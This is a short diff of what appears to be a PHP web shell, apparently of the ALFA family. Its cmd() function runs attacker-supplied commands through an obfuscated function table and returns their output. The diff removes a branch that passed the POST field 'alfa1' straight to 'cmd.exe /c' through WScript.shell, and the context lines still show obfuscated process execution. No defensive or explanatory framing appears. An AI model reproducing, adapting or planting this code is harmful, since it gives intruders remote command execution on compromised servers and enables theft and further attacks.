@@ -1459,11 +1459,6 @@ function cmd($in, $re = false)
             $pipes = array();
             $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
             $out = @$GLOBALS['fungsi'][22]($pipes[1]);
-        } elseif (class_exists('COM')) {
-            $alfaWs = new COM('WScript.shell');
-            $e = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
-            $stdout = $e->StdOut();
-            $out = $stdout->ReadAll();
         }
     } catch (Exception $e) {
     }
